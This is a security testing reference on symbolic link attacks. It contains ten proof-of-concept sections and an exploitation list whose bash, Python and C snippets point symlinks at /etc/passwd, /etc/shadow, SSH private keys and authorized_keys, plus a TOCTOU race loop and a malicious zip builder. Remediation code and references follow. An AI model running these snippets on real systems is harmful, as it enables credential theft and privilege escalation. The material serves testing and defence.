# Symbolic Link Attacks (Symlink Attacks)

## Description
Symbolic link attacks, also known as symlink attacks, exploit the behavior of symbolic links (symlinks) in file systems. A symbolic link is a file that points to another file or directory. Attackers can manipulate symlinks to trick applications into accessing, modifying, or deleting files they shouldn't have access to, leading to privilege escalation, information disclosure, or denial of service.

## How Symbolic Link Attacks Work
When an application follows a symbolic link without proper validation:
1. Attacker creates a symlink pointing to a sensitive file
2. Application attempts to write/read to the symlink path
3. Operation is performed on the target file instead
4. Results in unauthorized file access, modification, or deletion

## Common Vulnerabilities

### 1. **Time-of-Check-Time-of-Use (TOCTOU)**
Application checks file permissions, attacker replaces file with symlink before use.

### 2. **Insecure Temporary File Handling**
Applications create predictable temp files that can be symlinked.

### 3. **Log File Symlink**
Replacing log files with symlinks to sensitive files.

### 4. **Archive Extraction**
Extracting archives containing malicious symlinks.

### 5. **File Upload Symlink**
Uploading symlinks via file upload functionality.

### 6. **Configuration File Symlink**
Symlinking configuration files to gain access or privileges.

### 7. **Backup/Restore Symlink**
Exploiting backup processes that follow symlinks.

## Common Attack Vectors
- Temporary file operations
- Log file handling
- File upload functionality
- Archive extraction (tar, zip)
- Backup/restore operations
- Cache directories
- Configuration file access
- Web server document roots

## Testing Methodology & PoC Examples

### PoC 1: Basic Symlink Attack on Temp Files

**Vulnerability:** Application creates predictable temp files.

**Steps to Test:**
1. Identify temp file creation pattern
2. Create symlink before application creates file
3. Application writes to symlink, modifying target file

**Attack:**
```bash
# Attacker predicts temp file location
# Application will create /tmp/app_12345.tmp

# Attacker creates symlink first
ln -s /etc/passwd /tmp/app_12345.tmp

# When application writes to /tmp/app_12345.tmp,
# it actually writes to /etc/passwd
```

**Python Example:**
```python
import os
import time

# Predict temporary file name
temp_file = f"/tmp/app_{os.getpid()}.tmp"

# Create symlink to target
os.symlink("/etc/shadow", temp_file)

# Wait for application to write to temp file
# Application unknowingly writes to /etc/shadow
```

---

### PoC 2: TOCTOU Race Condition with Symlinks

**Vulnerability:** Time gap between checking and using a file.

**Steps to Test:**
1. Application checks if file is safe
2. Attacker quickly replaces file with symlink
3. Application uses the symlink

**Bash Script:**
```bash
#!/bin/bash
# Exploit TOCTOU vulnerability

TARGET="/path/to/sensitive/file"
EXPLOITED="/path/to/app/data/file.txt"

while true; do
    # Remove existing file
    rm -f "$EXPLOITED" 2>/dev/null
    
    # Create normal file (passes checks)
    touch "$EXPLOITED"
    
    # Quickly replace with symlink
    rm -f "$EXPLOITED"
    ln -s "$TARGET" "$EXPLOITED"
done
```

**C Example:**
```c
// Vulnerable code
if (access(filename, W_OK) == 0) {
    // RACE CONDITION WINDOW
    // Attacker can replace file with symlink here
    
    FILE *fp = fopen(filename, "w");
    fprintf(fp, "sensitive data");
    fclose(fp);
}
```

---

### PoC 3: Log File Symlink Attack

**Vulnerability:** Application writes to log files without checking for symlinks.

**Steps to Test:**
1. Identify log file location
2. Replace log file with symlink to target
3. Application logs trigger write to target file

**Attack:**
```bash
# Application writes to /var/log/app.log

# Attacker replaces log file
rm /var/log/app.log
ln -s /etc/passwd /var/log/app.log

# Application's log writes now corrupt /etc/passwd
```

**Request to trigger logging:**
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json

{"data": "attacker_payload"}
```

**Result:** Log entry written to /etc/passwd instead of log file.

---

### PoC 4: Archive Extraction Symlink Attack (Zip Slip)

**Vulnerability:** Extracting archives containing malicious symlinks.

**Steps to Test:**
1. Create archive with symlinks pointing outside extraction directory
2. Upload or provide archive to application
3. Extraction follows symlinks, writing to unintended locations

**Creating Malicious Archive:**
```bash
# Create malicious tar archive
mkdir evil
cd evil
ln -s /etc/passwd symlink.txt
echo "evil content" > data.txt
cd ..
tar -czf evil.tar.gz evil/

# Or with absolute path symlink
ln -s /etc/passwd /tmp/evil_symlink
tar -czf evil.tar.gz /tmp/evil_symlink

# Zip with symlink
ln -s ../../../etc/passwd symlink
zip --symlinks evil.zip symlink
```

**Python Script to Create Malicious Zip:**
```python
import zipfile
import os

# Create zip with malicious symlink
with zipfile.ZipFile('evil.zip', 'w') as zf:
    # Create symlink entry
    info = zipfile.ZipInfo('link')
    info.create_system = 3  # Unix
    info.external_attr = 0o120777 << 16  # Symlink
    zf.writestr(info, '../../../etc/passwd')
```

---

### PoC 5: File Upload Symlink Bypass

**Vulnerability:** File upload allows symlink creation.

**Steps to Test:**
1. Create symlink on local system
2. Upload symlink file
3. Access uploaded symlink to read target file

**Creating Symlink for Upload:**
```bash
# Create symlink to sensitive file
ln -s /etc/passwd passwd_link.txt

# Upload passwd_link.txt via web form
# If server preserves symlink and allows access:
curl https://example.com/uploads/passwd_link.txt
# Returns contents of /etc/passwd
```

**Multipart Form Data:**
```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="link.txt"
Content-Type: application/octet-stream

<symlink binary data>
------boundary--
```

---

### PoC 6: Configuration File Symlink

**Vulnerability:** Application reads configuration from predictable location.

**Steps to Test:**
1. Identify config file location
2. Create symlink from config location to attacker-controlled file
3. Application reads attacker's configuration

**Attack:**
```bash
# Application reads /etc/app/config.ini

# Attacker creates symlink
rm /etc/app/config.ini
ln -s /tmp/attacker_config.ini /etc/app/config.ini

# Attacker's config file
cat > /tmp/attacker_config.ini << EOF
[auth]
admin_password=hacked
debug_mode=true
EOF
```

---

### PoC 7: Web Document Root Symlink

**Vulnerability:** Web server follows symlinks in document root.

**Steps to Test:**
1. Upload or create symlink in web root
2. Access symlink via browser
3. Read arbitrary files from server

**Attack:**
```bash
# Create symlink in web directory
cd /var/www/html/uploads/
ln -s /etc/passwd passwd.txt
ln -s /home/user/.ssh/id_rsa key.txt

# Access via browser
curl https://example.com/uploads/passwd.txt
# Returns /etc/passwd contents
```

**Apache Configuration Exploitation:**
```apache
# If Options FollowSymLinks is enabled
<Directory /var/www/html>
    Options FollowSymLinks  # Vulnerable!
</Directory>
```

---

### PoC 8: Backup Symlink Attack

**Vulnerability:** Backup process follows symlinks.

**Steps to Test:**
1. Identify backup process and source directory
2. Create symlinks in backup source pointing to sensitive files
3. Backup includes sensitive files

**Attack:**
```bash
# Application backs up /home/user/data/

# Attacker creates symlinks in data directory
cd /home/user/data/
ln -s /etc/shadow shadow_backup
ln -s /root/.ssh/id_rsa root_key

# Backup process follows symlinks and includes sensitive files
# Attacker extracts sensitive files from backup archive
```

---

### PoC 9: Cache Directory Symlink

**Vulnerability:** Application caches data in directory with weak permissions.

**Steps to Test:**
1. Identify cache directory
2. Replace cache file with symlink
3. Application writes cached data to target file

**Attack:**
```bash
# Application caches to /tmp/app_cache/user_123

# Attacker creates symlink
rm -rf /tmp/app_cache/user_123
ln -s /home/victim/.ssh/authorized_keys /tmp/app_cache/user_123

# Application writes cache data (containing attacker's SSH key)
# to victim's authorized_keys file
```

---

### PoC 10: Symlink Directory Traversal

**Vulnerability:** Application accepts file paths without proper validation.

**Steps to Test:**
1. Create symlink chain for directory traversal
2. Use symlinks to access files outside intended directory

**Attack:**
```bash
# Create symlink chain
mkdir -p /tmp/uploads/a/b/c
cd /tmp/uploads
ln -s / a/b/c/root

# Request file via application
GET /api/download?file=a/b/c/root/etc/passwd
# Application follows symlink to /etc/passwd
```

---

## Exploitation Techniques

### 1. **Privilege Escalation**
```bash
# Replace /etc/passwd with symlink to attacker-controlled file
# When application writes to "passwd", it writes to attacker's file
ln -s /tmp/attacker_passwd /etc/passwd
```

### 2. **SSH Key Injection**
```bash
# Symlink authorized_keys
ln -s /tmp/attacker_keys /home/victim/.ssh/authorized_keys
# Application writes attacker's key to authorized_keys
```

### 3. **Configuration Override**
```bash
# Symlink config file
ln -s /tmp/evil_config /etc/app/app.conf
```

### 4. **Arbitrary File Read**
```bash
# Symlink in web root
ln -s /etc/passwd /var/www/html/exposed.txt
```

### 5. **Arbitrary File Write**
```bash
# Symlink temp file to target
ln -s /etc/crontab /tmp/app_temp_file
```

### 6. **Denial of Service**
```bash
# Symlink to /dev/zero or /dev/random
ln -s /dev/zero /var/log/app.log
# Application hangs trying to read infinite data
```

## Detection and Testing Tools

### 1. **Manual Testing**
```bash
# Check if symlinks are followed
ln -s /etc/passwd test_link.txt
# Upload and access test_link.txt

# Check temp file creation
strace -e openat,open application 2>&1 | grep tmp
```

### 2. **Automated Testing Script**
```python
import os
import time
import requests

def test_symlink_vulnerability(upload_url, access_url):
    # Create symlink to /etc/passwd
    symlink_name = "test_symlink.txt"
    os.symlink("/etc/passwd", symlink_name)
    
    # Upload symlink
    with open(symlink_name, 'rb') as f:
        files = {'file': f}
        response = requests.post(upload_url, files=files)
    
    # Try to access symlink
    response = requests.get(f"{access_url}/{symlink_name}")
    
    if "root:" in response.text:
        print("[!] Symlink vulnerability confirmed!")
        print(response.text)
    else:
        print("[+] No vulnerability detected")
    
    # Cleanup
    os.remove(symlink_name)
```

### 3. **Archive Testing**
```bash
# Create test archive with symlink
ln -s /etc/passwd testlink
tar -czf test.tar.gz testlink

# Upload and extract
# Check if extraction follows symlink
```

### 4. **TOCTOU Race Condition Testing**
```bash
# Run in parallel
while true; do
    rm -f target_file
    touch target_file
    rm -f target_file
    ln -s /etc/passwd target_file
done &

# Meanwhile, trigger application to use target_file
```

## Exploitation Impact

- **Critical:** Arbitrary file read/write, privilege escalation
- **High:** SSH key injection, configuration manipulation
- **Medium:** Information disclosure, DoS
- **Data Breach:** Access to sensitive files (passwords, keys, configs)

## Remediation

### 1. **Never Follow Symlinks**
```python
# Bad - Follows symlinks
with open(filename, 'r') as f:
    data = f.read()

# Good - Check for symlink first
import os
if os.path.islink(filename):
    raise Exception("Symlinks not allowed")
with open(filename, 'r') as f:
    data = f.read()
```

### 2. **Use O_NOFOLLOW Flag**
```c
// Open file without following symlinks
int fd = open(filename, O_RDONLY | O_NOFOLLOW);
if (fd == -1 && errno == ELOOP) {
    // File is a symlink
    printf("Symlink detected, access denied\n");
}
```

### 3. **Validate File Paths**
```python
import os
import pathlib

def is_safe_path(basedir, path):
    # Resolve both paths
    base = pathlib.Path(basedir).resolve()
    target = pathlib.Path(path).resolve()
    
    # Check if target is within basedir
    try:
        target.relative_to(base)
        return True
    except ValueError:
        return False
```

### 4. **Use Secure Temporary Files**
```python
import tempfile

# Secure temp file creation
with tempfile.NamedTemporaryFile(delete=False) as f:
    f.write(b"data")
    temp_filename = f.name
```

### 5. **Disable Symlinks in Web Server**
```apache
# Apache
<Directory /var/www/html>
    Options -FollowSymLinks
</Directory>

# Nginx
disable_symlinks on;
```

### 6. **Check File Type Before Operations**
```bash
# Check if file is a regular file
if [ -f "$file" ] && [ ! -L "$file" ]; then
    cat "$file"
else
    echo "Not a regular file or is a symlink"
fi
```

### 7. **Use chroot or Containers**
- Isolate application in restricted environment
- Limit file system access

### 8. **Atomic Operations**
```c
// Use O_EXCL to fail if file exists
int fd = open(filename, O_CREAT | O_EXCL | O_WRONLY, 0600);
if (fd == -1) {
    perror("File already exists");
    exit(1);
}
```

### 9. **File Permission Checks**
```python
import os
import stat

def is_safe_file(path):
    try:
        st = os.lstat(path)  # lstat doesn't follow symlinks
        
        # Check if it's a symlink
        if stat.S_ISLNK(st.st_mode):
            return False
        
        # Check if it's a regular file
        if not stat.S_ISREG(st.st_mode):
            return False
        
        return True
    except OSError:
        return False
```

### 10. **Input Validation for Archives**
```python
import tarfile
import os

def safe_extract(tar_path, extract_path):
    with tarfile.open(tar_path, 'r') as tar:
        for member in tar.getmembers():
            # Check for absolute paths
            if member.name.startswith('/'):
                raise Exception("Absolute path in archive")
            
            # Check for path traversal
            if '..' in member.name:
                raise Exception("Path traversal in archive")
            
            # Check if symlink
            if member.issym() or member.islnk():
                raise Exception("Symlinks not allowed in archive")
            
            # Safe extraction
            tar.extract(member, extract_path)
```

## References

- [CWE-59: Improper Link Resolution Before File Access](https://cwe.mitre.org/data/definitions/59.html)
- [CWE-61: UNIX Symbolic Link Following](https://cwe.mitre.org/data/definitions/61.html)
- [CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability)

## Payloads

See `symbolic-link-payloads.txt` for a comprehensive list of symlink attack payloads and techniques.
